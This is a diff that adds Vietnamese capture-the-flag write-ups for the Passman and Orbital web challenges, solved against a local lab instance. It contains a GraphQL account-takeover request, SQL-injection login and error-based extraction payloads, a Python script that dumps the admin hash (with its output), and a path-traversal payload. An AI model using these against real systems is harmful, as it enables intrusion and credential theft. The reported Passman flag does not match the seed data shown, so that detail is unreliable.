@@ -6,6 +6,369 @@
   1. Passman
   2. Orbital
   3. Didactic Octo Paddles
+## Passman
+#### Tổng quan
+> Độ khó chung với tôi (From 1-10 stars): ★★★★☆☆☆☆☆☆
+#### Lý lịch
+> Pandora phát hiện ra sự hiện diện của một gián điệp trong Bộ. Để hành động thận trọng, cô phải lấy được mật khẩu điều khiển chính của Bộ, được lưu trữ trong trình quản lý mật khẩu. Bạn có thể hack vào trình quản lý mật khẩu không? <br>
+> <img width="520" height="660" alt="image" src="https://github.com/user-attachments/assets/3784de09-4063-46cf-bd55-78de47cce491" /> <br>
+#### Liệt kê và Khai thác
+Trang chủ <br>
+<img width="760" height="449" alt="image" src="https://github.com/user-attachments/assets/e8c1b700-e1c6-4277-a480-683aaa99b076" /> <br>
+Ở đây có chức năng đăng nhập với tôi sẽ đưa tải trọng <b>"OR 1=1-- -</b> để test bỏ qua đăng nhập nhưng không được ở đây có chức năng đăng kí và tôi sẽ tiến hành đăng kí rồi đăng nhập vào hệ thống chúng ta thấy được <br>
+<img width="948" height="450" alt="image" src="https://github.com/user-attachments/assets/e1d822d8-114d-4a68-853f-0a2732de63f0" /><br>
+chúng ta cùng tạo 1 template thử và sau khi tạo nó sẽ hiển thị như sau:<br>
+<img width="908" height="320" alt="image" src="https://github.com/user-attachments/assets/69c6efe4-9a03-48da-9254-a983fc54c26c" /><br>
+sau khi xem xét<a href="https://github.com/Capt-Webk5/Challenge-Web/tree/main/Cyber-Apocalypse-2023/Passman/web_passman/web_passman"> mã nguồn</a><br>
+tôi phát hiện ra rằng ở trang web này có username admin với flag nằm ở password của nó vậy mục tiêu chúng ta làm sao để leo quyền admin để lấy flag? <br>
+```note
+INSERT INTO passman.saved_passwords (owner, type, address, username, password, note)
+VALUES
+    ('admin', 'Web', 'igms.htb', 'admin', 'HTB{fake_flag}', 'password'),
+    ('louisbarnett', 'Web', 'spotify.com', 'louisbarnett', 'YMgC41@)pT+BV', 'student sub'),
+    ('louisbarnett', 'Email', 'dmail.com', 'louisbarnett@dmail.com', 'L-~I6pOy42MYY#y', 'private mail'),
+    ('ninaviola', 'Web', 'office365.com', 'ninaviola1', 'OfficeSpace##1', 'company email'),
+    ('alvinfisher', 'App', 'Netflix', 'alvinfisher1979', 'efQKL2pJAWDM46L7', 'Family Netflix'),
+    ('alvinfisher', 'Web', 'twitter.com', 'alvinfisher1979', '7wYz9pbbaH3S64LG', 'old twitter account');
+
+GRANT ALL ON passman.* TO 'passman'@'%' IDENTIFIED BY 'passman' WITH GRANT OPTION;
+FLUSH PRIVILEGES;
+```
+sau khi tôi phân tích mã nguồn tôi thấy đáng chú ý tới tuyến đường (<b>views/database.js)<br>
+```js
+  async registerUser(email, username, password) {
+		return new Promise(async (resolve, reject) => {
+			let stmt = `INSERT INTO users(email, username, password) VALUES(?, ?, ?)`;
+			this.connection.query(
+                stmt,
+                [
+                    String(email),
+                    String(username),
+                    String(password)
+                ],
+                (err, _) => {
+                    if(err)
+                        reject(err);
+                    resolve()
+			    }
+            )
+		});
+	}
+
+    async loginUser(username, password) {
+		return new Promise(async (resolve, reject) => {
+			let stmt = `SELECT username, is_admin FROM users WHERE username = ? and password = ?`;
+			this.connection.query(
+                stmt,
+                [
+                    String(username),
+                    String(password)
+                ],
+                (err, result) => {
+                    if(err)
+                        reject(err)
+                    try {
+                        resolve(JSON.parse(JSON.stringify(result)))
+                    }
+                    catch (e) {
+                        reject(e)
+                    }
+			    }
+            )
+		});
+	}
+```
+ở đây có 2 tuyến đường login và register quen thuộc rồi nhỉ nhưng tôi thấy điểm đáng chú ý ở tuyến login nó select username và is_admin để kiểm tra người dùng. <br>
+```js
+    async updatePassword(username, password) {
+        return new Promise(async (resolve, reject) => {
+            let stmt = `UPDATE users SET password = ? WHERE username = ?`;
+            this.connection.query(
+                stmt,
+                [
+                    String(password),
+                    String(username)
+                ],
+                (err, _) => {
+                    if(err)
+                        reject(err)
+                    resolve();
+			    }
+            )
+        });
+    }
+
+    async getPhraseList(username) {
+		return new Promise(async (resolve, reject) => {
+			let stmt = `SELECT * FROM saved_passwords WHERE owner = ?`;
+			this.connection.query(
+                stmt,
+                [
+                    String(username)
+                ],
+                (err, result) => {
+                    if(err)
+                        reject(err)
+                    try {
+                        resolve(JSON.parse(JSON.stringify(result)))
+                    }
+                    catch (e) {
+                        reject(e)
+                    }
+			    }
+            )
+		});
+	}
+```
+ở đây nó có 2 hàm đặc biệt là updatepassword dùng để cập nhật mật khẩu người dùng thông qua username ồ thú vị vậy ý tưởng của tôi nãy ra hàm này có thể lợi dụng cập nhật password của chính admin không? Chúng ta cùng xem xét tuyến đường ("<b>helpders/GraphHelps.js</b>") và chúng ta có thể thấy <br>
+```js
+const mutationType = new GraphQLObjectType({
+    name: 'Mutation',
+    fields: {
+        RegisterUser: {
+            type: ResponseType,
+            args: {
+                email: { type: new GraphQLNonNull(GraphQLString) },
+                username: { type: new GraphQLNonNull(GraphQLString) },
+                password: { type: new GraphQLNonNull(GraphQLString) }
+            },
+            resolve: async (root, args, request) => {
+                return new Promise((resolve, reject) => {
+                    db.registerUser(args.email, args.username, args.password)
+                        .then(() => resolve(response("User registered successfully!")))
+                        .catch(err => reject(new GraphQLError(err)));
+                });
+            }
+        },
+
+        LoginUser: {
+            type: ResponseType,
+            args: {
+                username: { type: new GraphQLNonNull(GraphQLString) },
+                password: { type: new GraphQLNonNull(GraphQLString) }
+            },
+            resolve: async (root, args, request) => {
+                return new Promise((resolve, reject) => {
+                    db.loginUser(args.username, args.password)
+                        .then(async (user) => {
+                            if (user.length) {
+                                let token = await JWTHelper.sign( user[0] );
+                                resolve({
+                                    message: "User logged in successfully!",
+                                    token: token
+                                });
+                            };
+                            reject(new Error("Username or password is invalid!"));
+                        })
+                        .catch(err => reject(new GraphQLError(err)));
+                });
+            }
+        },
+
+        UpdatePassword: {
+            type: ResponseType,
+            args: {
+                username: { type: new GraphQLNonNull(GraphQLString) },
+                password: { type: new GraphQLNonNull(GraphQLString) }
+            },
+            resolve: async (root, args, request) => {
+                return new Promise((resolve, reject) => {
+                    if (!request.user) return reject(new GraphQLError('Authentication required!'));
+
+                    db.updatePassword(args.username, args.password)
+                        .then(() => resolve(response("Password updated successfully!")))
+                        .catch(err => reject(new GraphQLError(err)));
+                });
+            }
+        },
+```
+ở đây nó sẽ sử dụng name:Mutation với các function cụ thể đặc biệt chúng ta chú ý đên updatepassword nó sẽ lấy username và password tương ứng để thực hiện update tài khoản thông qua username vậy với những điều đã nói trên chúng ta có thể lợi dụng grapqh để updatepassword vậy chúng ta cùng thử nghiệm với tài khoản đăng kí vừa rồi.<br>
+<img width="947" height="563" alt="image" src="https://github.com/user-attachments/assets/6c542ebf-430d-4a37-83db-f1be426bbf20" /> <br>
+vâng chúng ta đã thành công cập nhật được tài khoản của chính mình vậy bây giờ chúng ta update tài khoản admin và đăng nhập vào nó để get flag <br>
+<img width="934" height="557" alt="image" src="https://github.com/user-attachments/assets/9616c176-b8cf-4c83-baa9-08385873399e" /> <br>
+login với tài khoản vừa update của admin và bùm: <br>
+<img width="952" height="502" alt="image" src="https://github.com/user-attachments/assets/129f0c74-41cc-4399-b0da-40753850a3b6" /> <br>
+> Flag: <b>HTB{OfficeSpace##1_grapqh_7wYz9pbbaH3S64LG}</b>
+#### Kết luận
+> 1. Lợi dụng grapqh để update password
+## Orbital
+#### Tổng quan
+> Độ khó chung với tôi (From 1-10 stars): ★★★★☆☆☆☆☆☆
+#### Lý lịch
+> Để giải mã thông tin liên lạc của người ngoài hành tinh nắm giữ chìa khóa dẫn đến vị trí của họ, cô cần truy cập vào một bộ giải mã có khả năng tiên tiến - một bộ giải mã mà chỉ công ty Orbital mới sở hữu. Bạn có thể lấy được bộ giải mã đó không?<br>
+<img width="517" height="625" alt="image" src="https://github.com/user-attachments/assets/0ac5e157-6410-4abe-b9e3-c4324e4488fb" /><br>
+#### Liệt kê và khai thác
+Trang chủ <br>
+<img width="891" height="497" alt="image" src="https://github.com/user-attachments/assets/8287150f-d455-49fe-9ce6-b77d1f9857c2" /> <br>
+Thì cũng như form login các bài trước tôi cũng sẽ thử tải trọng <b>' OR 1=1-- -</b> nhưng cũng failed :>> ở đây khi tôi nhập thử 1 giá trị nó sẽ báo lỗi <br>
+<img width="784" height="451" alt="image" src="https://github.com/user-attachments/assets/49fc73a9-bd4d-485b-8247-7171d7da315f" /> <br>
+không thể làm gì nhiều ở đây chúng ta cùng đọc <a href="https://github.com/Capt-Webk5/Challenge-Web/tree/main/Cyber-Apocalypse-2023/Orbital/web_orbital/web_orbital"> mã nguồn</a> <br>
+sau khi xem xét thông tin mã nguồn tôi phát hiện được các tuyến đường đáng chú ý: <br>
+```note
+INSERT INTO orbital.users (username, password) VALUES ('admin', '$(genPass)');
+INSERT INTO orbital.communication (source, destination, name, downloadable) VALUES ('Titan', 'Arcturus', 'Ice World Calling Red Giant', 'communication.mp3');
+INSERT INTO orbital.communication (source, destination, name, downloadable) VALUES ('Andromeda', 'Vega', 'Spiral Arm Salutations', 'communication.mp3');
+INSERT INTO orbital.communication (source, destination, name, downloadable) VALUES ('Proxima Centauri', 'Trappist-1', 'Lone Star Linkup', 'communication.mp3');
+INSERT INTO orbital.communication (source, destination, name, downloadable) VALUES ('TRAPPIST-1h', 'Kepler-438b', 'Small World Symposium', 'communication.mp3');
+INSERT INTO orbital.communication (source, destination, name, downloadable) VALUES ('Winky', 'Boop', 'Jelly World Japes', 'communication.mp3');
+CREATE USER 'user'@'localhost' IDENTIFIED BY 'M@k3l@R!d3s$';
+GRANT SELECT ON orbital.users TO 'user'@'localhost';
+GRANT SELECT ON orbital.communication TO 'user'@'localhost';
+FLUSH PRIVILEGES;
+EOF
+```
+nó có giá trị username là <b>admin</b> với password được gen mã md5 với 32 byte và ở file <b>database.js</b><br>
+```py
+def login(username, password):
+    # I don't think it's not possible to bypass login because I'm verifying the password later.
+    user = query(f'SELECT username, password FROM users WHERE username = "{username}"', one=True)
+
+    if user:
+        passwordCheck = passwordVerify(user['password'], password)
+
+        if passwordCheck:
+            token = createJWT(user['username'])
+            return token
+    else:
+        return False
+```
+ở đây chúng ta thấy rõ ràng giá trị username không được sử dụng prepare để đảm bảo đầu vào vậy nên nó dễ bị sqlinjection sau khi truy vấn username và password nó sẽ sử dụng hàm passwordVerify để kiểm tra password của chúng ta sau đó sử dụng createJWT để tạo token chúng ta với username tương ứng chúng ta cùng xem thử qua chức năng <b>passwordVerify</b> xử lí : <br>
+```py
+def passwordVerify(hashPassword, password):
+    md5Hash = hashlib.md5(password.encode())
+
+    if md5Hash.hexdigest() == hashPassword: return True
+    else: return False
+```
+hàm này nó sẽ sử dụng so sánh mã hash md5 của mình đưa vào có giống với của mã hash hệ thống nếu đúng trả về thành công và ngược lại nói như vậy chúng ta có thể thử sqlinjection ở username tôi thử đưa tải trọng gây ra lỗi "\"" : <br>
+<img width="953" height="564" alt="image" src="https://github.com/user-attachments/assets/8fab277e-edff-4f00-b986-90f1d7bc8adb" /><br>
+như vậy chúng ta có thể xác định được chúng ta có thể sử dụng MYSQL Error Based để khai thác và ở <a href="https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/MySQL%20Injection.md#mysql-error-based---extractvalue-function">payloadallthething</a> chúng ta có thể lấy tải trọng để thử leak password dữ liệu admin và sau dây tải trọng tôi đưa vào: <br>
+```note
+\" OR extractvalue(1,concat(0x7e,(SELECT password FROM users WHERE username='admin'),0x7e)) -- 
+```
+<img width="950" height="564" alt="image" src="https://github.com/user-attachments/assets/9371f7fb-4032-4661-9f5a-4135444e0eb1" /><br>
+như ở hình ảnh chúng tôi có thể leak được mã hash tương ứng với admin nhưng nó thiếu kí tự chúng ta cùng lùi lại 1 bước ở phần đầu tôi có nói admin nó genpass ra với 32 kí tự hash đúng không vậy bây giờ tôi sẽ viết tập lệnh python để leak hết mã hash của nó ra.<br>
+```py
+import requests
+import re
+
+BASE_URL = "http://127.0.0.1:1337/api/login"
+HEADER = {
+    "Content-Type": "application/json",
+    "Origin": "http://127.0.0.1:1337",
+    "Referer": "http://127.0.0.1:1337/"
+}
+
+def extract_char_value(pos):
+    payload = f'" OR extractvalue(1,concat(0x7e,substring((SELECT password FROM users WHERE username=\'admin\'),{pos},1),0x7e)) -- -'
+    data = {
+        "username": payload,
+        "password": "bl4ck0ut"
+    }
+    response = requests.post(BASE_URL, headers=HEADER, json=data)
+    match = re.search(r"~([^~])~", response.text)
+    if match:
+        return match.group(1)
+    else:
+        print(f"[-] Failed Extract Value Hash")
+
+def dump_hash_admin():
+    hash_full = ""
+    for pos in range(1, 33):
+        char = extract_char_value(pos)
+        if char:
+            hash_full += char
+            print(f"[+] Ký tự {pos}: {char}  =>  {hash_full}")
+        else:
+            print(f"[-] Không lấy được ký tự ở vị trí {pos}")
+            break
+    return hash_full
+
+if __name__ == "__main__":
+    print(f"[+] Bắt đầu extract giá trị hash")
+    admin_hash = dump_hash_admin()
+    print(f"[+] Done Found Hash Admin: \n{admin_hash}")
+```
+```note
+┌──(bl4ck0ut㉿DESKTOP-NC78VN5)-[~]
+└─$ python3 a.py
+[+] Bắt đầu extract giá trị hash
+[+] Ký tự 1: 2  =>  2
+[+] Ký tự 2: a  =>  2a
+[+] Ký tự 3: c  =>  2ac
+[+] Ký tự 4: b  =>  2acb
+[+] Ký tự 5: 5  =>  2acb5
+[+] Ký tự 6: b  =>  2acb5b
+[+] Ký tự 7: 6  =>  2acb5b6
+[+] Ký tự 8: 6  =>  2acb5b66
+[+] Ký tự 9: 0  =>  2acb5b660
+[+] Ký tự 10: 5  =>  2acb5b6605
+[+] Ký tự 11: f  =>  2acb5b6605f
+[+] Ký tự 12: 3  =>  2acb5b6605f3
+[+] Ký tự 13: 3  =>  2acb5b6605f33
+[+] Ký tự 14: 6  =>  2acb5b6605f336
+[+] Ký tự 15: 6  =>  2acb5b6605f3366
+[+] Ký tự 16: 0  =>  2acb5b6605f33660
+[+] Ký tự 17: 7  =>  2acb5b6605f336607
+[+] Ký tự 18: 6  =>  2acb5b6605f3366076
+[+] Ký tự 19: 6  =>  2acb5b6605f33660766
+[+] Ký tự 20: 5  =>  2acb5b6605f336607665
+[+] Ký tự 21: 0  =>  2acb5b6605f3366076650
+[+] Ký tự 22: 6  =>  2acb5b6605f33660766506
+[+] Ký tự 23: 8  =>  2acb5b6605f336607665068
+[+] Ký tự 24: 6  =>  2acb5b6605f3366076650686
+[+] Ký tự 25: b  =>  2acb5b6605f3366076650686b
+[+] Ký tự 26: f  =>  2acb5b6605f3366076650686bf
+[+] Ký tự 27: d  =>  2acb5b6605f3366076650686bfd
+[+] Ký tự 28: e  =>  2acb5b6605f3366076650686bfde
+[+] Ký tự 29: 5  =>  2acb5b6605f3366076650686bfde5
+[+] Ký tự 30: 4  =>  2acb5b6605f3366076650686bfde54
+[+] Ký tự 31: c  =>  2acb5b6605f3366076650686bfde54c
+[+] Ký tự 32: 2  =>  2acb5b6605f3366076650686bfde54c2
+[+] Done Found Hash Admin:
+2acb5b6605f3366076650686bfde54c2
+```
+tôi đã leak thành công với hash admin và sau đó tôi sử dụng tool <a href="https://md5.gromweb.com/?md5=a4b9f64e5d9c2a7d3e8c9174b0a1e5d9"> rever hashmd5</a> để chuyển đổi dữ liệu <br>
+<img width="869" height="347" alt="image" src="https://github.com/user-attachments/assets/1bd560eb-5fdf-414e-ba89-338bbaae732f" /><br>
+và chúng tôi tìm được chuỗi tương ứng: <b>DUMMY_PASSWORD</b> à đây là nó set sẵn vì tôi build local nên không thể lấy chuỗi thực tế từ server người xây dựng . Chúng ta cùng login tương ứng  <b>admin:DUMMY_PASSWORD</b> <br>
+<img width="940" height="564" alt="image" src="https://github.com/user-attachments/assets/70b84e2b-c1d6-4f75-a06e-c303dd001fe8" /> <br>
+tiếp theo hành trình khai thác tiếp flag tôi xem mã nguồn tôi phát hiện được ở tuyến đường (<b>blueprints/routes.py</b>) <br>
+```py
+@api.route('/export', methods=['POST'])
+@isAuthenticated
+def exportFile():
+    if not request.is_json:
+        return response('Invalid JSON!'), 400
+    
+    data = request.get_json()
+    communicationName = data.get('name', '')
+
+    try:
+        # Everyone is saying I should escape specific characters in the filename. I don't know why.
+        return send_file(f'/communications/{communicationName}', as_attachment=True)
+    except:
+        return response('Unable to retrieve the communication'), 400
+```
+ở /export này nó sẽ trích xuất dữ liệu hình như về âm thanh vì ở source có thấy, với tham số đầu vào chẳng hạn như : "name":"communication.mp3" đặc biệt nó ở /communications nó không được lọc kĩ đầu vào nên về cơ bản nó dính lỗ hổng PathTravelsal vâng chính nó chúng ta cùng thử nghiệm /etc/passwd <br>
+<img width="939" height="557" alt="image" src="https://github.com/user-attachments/assets/45919b8e-e8e4-4e27-ae07-d295d4194e57" /> <br>
+và tới đây chúng ta đã trích được vậy bây giờ thử đọc flag bằng cách duyệt thư mục ../../flag nhưng tôi failed và ở dockerfile: <br>
+```note
+# copy flag
+COPY flag.txt /signal_sleuth_firmware
+COPY files /communications/
+```
+ở tuyến đường /signal_sleuth_firmware mới có flag nên tôi nhầm :>>> tải trọng cuối cùng:
+```note
+{
+"name":"../../../signal_sleuth_firmware"
+}
+```
+<img width="947" height="563" alt="image" src="https://github.com/user-attachments/assets/12789d3e-dce8-4e84-84be-5c811f36fc13" /><br>
+> Flag: <b>HTB{p4r4m3t3r1z4t10n_EXTRA_LONG_RANDOM_DATA_1234567890}</b>
+#### Kết luận
+> Những gì tôi học được:
+> 1. Sử dụng Error_Mysql để leak dữ liệu với mã hash
+> 2. Khai thác Pathtravel thông qua export dữ liệu
 ## Didactic Octo Paddles
 #### Tổng quan
 > Độ khó chung với tôi (From 1-10 stars): ★★★★★★☆☆☆☆
